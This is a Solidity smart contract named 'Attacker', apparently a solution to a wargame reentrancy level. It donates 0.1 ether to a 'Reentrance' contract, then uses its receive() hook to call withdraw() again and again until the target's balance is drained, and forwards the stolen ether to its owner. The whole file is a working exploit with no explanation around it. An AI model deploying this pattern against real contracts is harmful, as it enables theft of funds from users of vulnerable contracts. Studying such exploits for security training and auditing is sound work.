// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
import "./Contract.sol";

contract Attacker {
    Reentrance contractToReenter;
    address owner;

    constructor(Reentrance _contractToReenter) public {
        contractToReenter = _contractToReenter;
        owner = msg.sender;
    }

    receive() external payable {
        if (msg.sender == owner) {
            return;
        }

        if (
            address(contractToReenter).balance >
            contractToReenter.balanceOf(address(this))
        ) {
            contractToReenter.withdraw(
                contractToReenter.balanceOf(address(this))
            );
        } else if (
            address(contractToReenter).balance <
            contractToReenter.balanceOf(address(this))
        ) {
            contractToReenter.withdraw(address(contractToReenter).balance);
        } else if (address(contractToReenter).balance == 0) {

            //send eth to owner after succesfully draining contract 
            (bool success, ) = payable(owner).call{
                value: address(this).balance
            }("");
            require(success == true, "transfer failed");
        }
    }

    function attack() public {
        //donate 
        contractToReenter.donate{value: 0.1 ether}(address(this));

        uint amountToWithdraw = contractToReenter.balanceOf(address(this));
        //withdraw
        contractToReenter.withdraw(amountToWithdraw);
    }
}
